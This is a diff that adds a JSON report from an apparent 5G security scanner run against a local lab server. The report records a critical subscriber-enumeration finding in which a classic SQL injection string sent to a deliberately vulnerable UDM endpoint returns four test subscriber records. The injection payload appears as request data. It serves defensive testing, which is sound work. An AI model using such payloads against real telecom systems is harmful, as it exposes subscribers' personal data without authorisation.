@@ -1,0 +1,29 @@
+{
+  "tool": "5G Scanner",
+  "mode": "scan",
+  "target": "http://127.0.0.1:8000",
+  "timestamp": "2026-04-30T11:21:57.994310+00:00",
+  "findings": [
+    {
+      "check_id": "CHECK-004",
+      "name": "Subscriber Enumeration",
+      "status": "VULNERABLE",
+      "severity": "CRITICAL",
+      "affected_nf": "UDM",
+      "endpoint": "/api/udm/vulnerable/subscribers",
+      "request": {
+        "method": "GET",
+        "path": "/api/udm/vulnerable/subscribers",
+        "params": {
+          "q": "' OR '1'='1' --"
+        }
+      },
+      "response": {
+        "status_code": 200,
+        "body": "{\"records_returned\": 4, \"records\": [{\"supi\": \"imsi-001010000000001\", \"ue_name\": \"Amina Haddad\", \"network_slice\": \"eMBB\", \"status\": \"ACTIVE\", \"trust_tier\": \"gold\"}, {\"supi\": \"imsi-001010000000002\", \"ue_name\": \"Yacine Merabet\", \"network_slice\": \"URLLC\", \"status\": \"ACTIVE\", \"trust_tier\": \"platinum\"}, {\"supi\": \"imsi-001010000000003\", \"ue_name\": \"Salma Bensalem\", \"network_slice\": \"mMTC\", \"status\": \"SUSPENDED\", \"trust_tier\": \"silver\"}, {\"supi\": \"imsi-001010000000004\", \"ue_name\": \"Nassim Khelifi\", \"network_slice\": \"eMBB\", \"status\": \"ACTIVE\", \"trust_tier\": \"gold\"}]}"
+      },
+      "evidence": "Vulnerable UDM flow returned 4 records for query `' OR '1'='1' --`.",
+      "conclusion": "Subscriber lookups should not leak unrelated records through crafted SUPI input."
+    }
+  ]
+}
